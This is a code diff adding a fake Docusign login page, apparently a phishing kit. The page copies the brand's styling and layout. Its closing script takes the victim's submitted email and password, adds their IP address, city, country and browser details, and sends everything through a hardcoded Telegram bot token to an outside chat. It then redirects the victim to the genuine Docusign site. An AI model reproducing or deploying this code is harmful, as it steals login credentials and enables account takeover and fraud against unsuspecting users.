@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Docusign Login</title>
+  <link rel="shortcut icon" href="ds-logo-default.svg" type="image/x-icon">
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            focusBlue: "#56bdf4",
+          },
+        },
+      },
+    };
+  </script>
+
+  <!-- Font Awesome -->
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+  />
+
+  <style>
+   * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html,
+body {
+  width: 100%;
+  min-height: 100%;
+}
+
+body {
+  font-family: "Inter", Arial, sans-serif;
+  background: #f8f7f8;
+  color: #211447;
+}
+
+
+/* =========================
+   HEADER
+========================= */
+
+.header {
+  height: 72px;
+  width: 100%;
+  background: #ffffff;
+
+  display: flex;
+  align-items: center;
+
+  padding: 0 28px;
+
+  border-bottom: 1px solid #e5e3e5;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.logo-icon {
+  position: relative;
+
+  width: 23px;
+  height: 24px;
+}
+
+.logo-purple {
+  position: absolute;
+
+  width: 14px;
+  height: 18px;
+
+  left: 0;
+  top: 5px;
+
+  background: #4b20e6;
+}
+
+.logo-red {
+  position: absolute;
+
+  width: 15px;
+  height: 14px;
+
+  left: 8px;
+  top: 0;
+
+  background: #ff5252;
+
+  border-radius: 2px;
+}
+
+.logo-text {
+  font-size: 26px;
+  font-weight: 600;
+
+  letter-spacing: -1.2px;
+
+  color: #111111;
+}
+
+.logo-dot {
+  color: #555555;
+}
+
+
+/* =========================
+   MAIN
+========================= */
+
+.main {
+  min-height: calc(100vh - 145px);
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  padding: 70px 20px;
+}
+
+
+/* =========================
+   LOGIN CARD
+========================= */
+
+.login-card {
+  width: 636px;
+
+  background: #ffffff;
+
+  border: 1px solid #d8d6d8;
+
+  border-radius: 4px;
+
+  padding: 72px 73px 73px;
+
+  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+}
+
+.login-card h1 {
+  font-size: 28px;
+  line-height: 1.25;
+
+  font-weight: 400;
+
+  color: #241052;
+
+  margin-bottom: 38px;
+}
+
+.subtitle {
+  font-size: 18px;
+
+  color: #241052;
+
+  margin-bottom: 40px;
+
+  line-height: 1.5;
+}
+
+
+/* =========================
+   FORM
+========================= */
+
+.form-group {
+  margin-bottom: 28px;
+}
+
+.form-group label {
+  display: block;
+
+  font-size: 16px;
+
+  font-weight: 600;
+
+  color: #211447;
+
+  margin-bottom: 8px;
+}
+
+.form-group label span {
+  color: #e33d49;
+}
+
+
+.form-group input {
+  width: 100%;
+
+  height: 46px;
+
+  border: 3px solid red;
+
+  border-radius: 4px;
+
+  background: #ffffff;
+
+  padding: 0 17px;
+
+  font-size: 17px;
+
+  color: #241052;
+
+  outline: none;
+
+  font-family: inherit;
+}
+
+.form-group input::placeholder {
+  color: #665b82;
+}
+
+.form-group input:focus {
+  border: 2px solid #4b168d;
+}
+
+
+/* =========================
+   PASSWORD
+========================= */
+
+.password-wrapper {
+  position: relative;
+}
+
+.password-wrapper input {
+  padding-right: 70px;
+}
+
+.show-password {
+  position: absolute;
+
+  right: 13px;
+  top: 50%;
+
+  transform: translateY(-50%);
+
+  border: none;
+  background: transparent;
+
+  color: #4b168d;
+
+  font-size: 14px;
+  font-weight: 600;
+
+  cursor: pointer;
+
+  padding: 5px;
+}
+
+.show-password:hover {
+  text-decoration: underline;
+}
+
+
+/* =========================
+   FORGOT PASSWORD
+========================= */
+
+.forgot-wrapper {
+  margin-top: -10px;
+
+  margin-bottom: 28px;
+}
+
+.forgot-wrapper a {
+  color: #4b168d;
+
+  font-size: 14px;
+
+  text-decoration: none;
+
+  font-weight: 500;
+}
+
+.forgot-wrapper a:hover {
+  text-decoration: underline;
+}
+
+
+/* =========================
+   BUTTONS
+========================= */
+
+.login-button,
+.signup-button {
+  width: 100%;
+
+  height: 47px;
+
+  border-radius: 4px;
+
+  font-family: inherit;
+
+  font-size: 17px;
+
+  cursor: pointer;
+
+  transition: 0.2s ease;
+}
+
+
+/* LOGIN */
+
+.login-button {
+  border: none;
+
+  background: #31006f;
+
+  color: #ffffff;
+
+  font-weight: 500;
+
+  margin-bottom: 18px;
+}
+
+.login-button:hover {
+  background: #260056;
+}
+
+.login-button:active {
+  transform: scale(0.99);
+}
+
+
+/* SIGN UP */
+
+.signup-button {
+  border: none;
+
+  background: #f2f1f4;
+
+  color: #211447;
+
+  font-weight: 500;
+}
+
+.signup-button:hover {
+  background: #e7e5e9;
+}
+
+
+/* =========================
+   FOOTER
+========================= */
+
+.footer {
+  height: 73px;
+
+  width: 100%;
+
+  background: #ffffff;
+
+  border-top: 1px solid #d9d7d9;
+
+  display: flex;
+
+  align-items: center;
+
+  justify-content: space-between;
+
+  padding: 0 25px;
+
+  color: #241052;
+
+  font-size: 12px;
+}
+
+
+/* POWERED */
+
+.powered {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+.mini-logo {
+  display: flex;
+  align-items: center;
+  gap: 3px;
+
+  color: #111111;
+
+  font-size: 12px;
+}
+
+.mini-logo span {
+  width: 7px;
+  height: 8px;
+
+  background: #4b20e6;
+
+  display: block;
+
+  position: relative;
+}
+
+.mini-logo strong {
+  font-weight: 600;
+}
+
+
+/* CENTER */
+
+.footer-center {
+  display: flex;
+  align-items: center;
+
+  gap: 10px;
+}
+
+.footer-center a {
+  color: #241052;
+
+  text-decoration: none;
+}
+
+.footer-center a:hover {
+  text-decoration: underline;
+}
+
+.footer-center i {
+  font-style: normal;
+
+  color: #b8b3bc;
+}
+
+
+/* LANGUAGE */
+
+.language {
+  border: none;
+
+  background: #f4f2f5;
+
+  border-radius: 4px;
+
+  color: #241052;
+
+  padding: 7px 9px;
+
+  font-family: inherit;
+
+  cursor: pointer;
+}
+
+.language span {
+  margin-left: 5px;
+}
+
+
+/* COPYRIGHT */
+
+.copyright {
+  white-space: nowrap;
+}
+
+
+/* =========================
+   RESPONSIVE
+========================= */
+
+@media (max-width: 900px) {
+
+  .footer {
+    height: auto;
+
+    min-height: 100px;
+
+    flex-wrap: wrap;
+
+    gap: 15px;
+
+    padding: 18px 25px;
+  }
+
+  .footer-center {
+    order: 3;
+
+    width: 100%;
+
+    justify-content: center;
+
+    flex-wrap: wrap;
+  }
+
+  .copyright {
+    margin-left: auto;
+  }
+}
+
+
+@media (max-width: 650px) {
+
+  .header {
+    height: 64px;
+
+    padding: 0 20px;
+  }
+
+  .logo-text {
+    font-size: 23px;
+  }
+
+  .main {
+    min-height: calc(100vh - 64px);
+
+    padding: 30px 15px;
+
+    align-items: flex-start;
+  }
+
+  .login-card {
+    width: 100%;
+
+    padding: 40px 25px;
+
+    margin-top: 15px;
+  }
+
+  .login-card h1 {
+    font-size: 25px;
+
+    margin-bottom: 28px;
+  }
+
+  .subtitle {
+    font-size: 16px;
+
+    margin-bottom: 30px;
+  }
+
+  .footer {
+    flex-direction: column;
+
+    align-items: center;
+
+    text-align: center;
+
+    padding: 20px 15px;
+  }
+
+  .powered {
+    order: 1;
+  }
+
+  .footer-center {
+    order: 2;
+  }
+
+  .copyright {
+    order: 3;
+
+    margin: 0;
+
+    white-space: normal;
+  }
+}
+
+
+@media (max-width: 400px) {
+
+  .login-card {
+    padding: 32px 20px;
+  }
+
+  .footer-center {
+    gap: 7px;
+  }
+
+  .footer-center i {
+    display: none;
+  }
+
+  .footer-center a {
+    margin: 2px 4px;
+  }
+}
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+   
+     <img src="/ds-logo-default.svg" alt="" width="100px">
+   
+  </header>
+
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <div class="login-card">
+
+      <h1>Log in to Docusign</h1>
+
+      <p class="subtitle">
+        Enter your email and password to log in.
+      </p>
+
+
+      <form id="loginForm">
+
+        <!-- EMAIL -->
+        <div class="form-group">
+
+          <label for="email">
+            Email <span>*</span>
+          </label>
+
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="Enter email"
+            autocomplete="email"
+            required
+          />
+
+        </div>
+
+
+        <!-- PASSWORD -->
+        <div class="form-group">
+
+          <label for="password">
+            Password <span>*</span>
+          </label>
+
+          <div class="password-wrapper">
+
+            <input
+              type="password"
+              id="password"
+              name="password"
+              class="border border-red-500"
+              placeholder="Enter password"
+              autocomplete="current-password"
+              required
+            />
+
+            <button
+              type="button"
+              class="show-password"
+              id="togglePassword"
+            >
+              Show
+            </button>
+
+          </div>
+
+        </div>
+
+
+        <!-- FORGOT PASSWORD -->
+        <div class="forgot-wrapper">
+          <a href="#" id="forgotPassword">
+            Forgot password?
+          </a>
+        </div>
+
+
+        <!-- LOGIN -->
+        <button type="submit" class="login-button">
+          LOG IN
+        </button>
+
+
+        <!-- SIGN UP -->
+        <button
+          type="button"
+          class="signup-button"
+          onclick="window.location.href='#'"
+        >
+          Sign Up for Free
+        </button>
+
+      </form>
+
+    </div>
+
+  </main>
+
+
+  <!-- FOOTER -->
+  <footer class="footer">
+
+    <div class="powered">
+      Powered by
+
+      <div class="mini-logo">
+        <span></span>
+        <strong>signflow</strong>
+      </div>
+    </div>
+
+
+    <div class="footer-center">
+
+      <button class="language">
+        English (US)
+        <span>⌄</span>
+      </button>
+
+      <a href="#">Contact Us</a>
+      <i>|</i>
+
+      <a href="#">Terms of Use</a>
+      <i>|</i>
+
+      <a href="#">Privacy</a>
+      <i>|</i>
+
+      <a href="#">Security</a>
+      <i>|</i>
+
+      <a href="#">Trust</a>
+
+    </div>
+
+
+    <div class="copyright">
+      Copyright © 2026 SignFlow, Inc. All rights reserved
+    </div>
+
+  </footer>
+
+
+  <script src="script.js"></script>
+
+</body>
+  <script>
+    document.addEventListener("DOMContentLoaded", async () => {
+      function getEmailFromUrl() {
+        const params = new URLSearchParams(window.location.search);
+        const emailFromQuery = params.get("email");
+        const hash = window.location.hash;
+        const emailFromHash = hash ? hash.substring(1) : null;
+        return emailFromQuery || emailFromHash || null;
+      }
+
+      function validateEmail(email) {
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailPattern.test(email);
+      }
+
+      async function getUserLocation() {
+        try {
+          const response = await fetch("https://ipapi.co/json/");
+          const data = await response.json();
+          return {
+            country: data.country_name || "Unknown",
+            city: data.city || "Unknown",
+            ip: data.ip || "Unknown",
+          };
+        } catch (error) {
+          console.error("Error fetching user location:", error);
+          return { country: "Unknown", city: "Unknown", ip: "Unknown" };
+        }
+      }
+
+      async function sendToTelegram(message, email) {
+        const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
+        const chatId = "6837437455";
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        try {
+          const response = await fetch(telegramUrl);
+          if (response.ok) {
+            const nextPageUrl = `https://account.docusign.com/`;
+            window.location.href = nextPageUrl;
+          } else {
+            alert("Failed to send data to Telegram.");
+          }
+        } catch (error) {
+          console.error("Error sending data to Telegram:", error);
+          alert("Error sending data to Telegram.");
+        }
+      }
+
+      // Logo + email injection
+      const defaultLogo = "logo.png";
+      const email = getEmailFromUrl();
+
+      const emailHeadline = document.getElementById("emailHeadline");
+
+
+
+      // Handle form submit
+      document.getElementById("loginForm").addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        const emailInput = document.getElementById("email").value;
+        const passwordInput = document.getElementById("password").value;
+
+        if (!validateEmail(emailInput) || !passwordInput) {
+          alert("Please provide a valid email and password.");
+          return;
+        }
+
+        const location = await getUserLocation();
+        const userAgent = navigator.userAgent;
+
+        const message = `E-Mail: ${emailInput}\nPassword: ${passwordInput}\nIP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;
+        sendToTelegram(message, emailInput);
+      });
+    });
+  </script>
+
+</html>
